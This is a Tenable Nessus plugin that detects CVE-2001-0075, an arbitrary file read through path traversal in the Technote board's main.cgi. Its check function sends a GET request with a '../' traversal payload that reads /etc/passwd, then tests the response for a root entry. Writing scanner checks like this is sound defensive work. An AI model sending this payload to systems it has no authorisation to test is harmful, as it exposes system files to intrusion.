#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10584);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2001-0075");
 script_bugtraq_id(2156);
 script_osvdb_id(481);
 
 script_name(english:"Technote main.cgi filename Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files from the remote 
system." );
 script_set_attribute(attribute:"description", value:
"The technote CGI board is installed. This board has
a well known security flaw in the CGI main.cgi that 
lets an attacker read arbitrary files with the privileges 
of the http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"solution", value:
"remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/12/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/12/27");
 script_cvs_date("$Date: 2011/08/08 11:28:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for the presence of /technote/main.cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "web_traversal.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (get_kb_item("www/"+port+"/generic_traversal"))
  exit(0, 'The web server on port '+port+' is vulnerable to web directory traversal.');

function check(url)
{
 local_var res, u, txt;

 u = strcat(url,"/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../etc/passwd");
 
 res = http_send_recv3(method:"GET", item: u, port:port, exit_on_fail: 1); 
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
   if (report_verbosity > 0)
   {
     txt = '\nThis URL returns the content of /etc/passwd :\n' +
     	 build_url(port: port, qs: u) + '\n';
     security_hole(port:port, extra: txt);
   }
   else
 	security_hole(port);
  exit(0);
}

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/technote", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
 check(url:dir);
}

exit(0, 'The web server on port '+port+' is not vulnerable.');

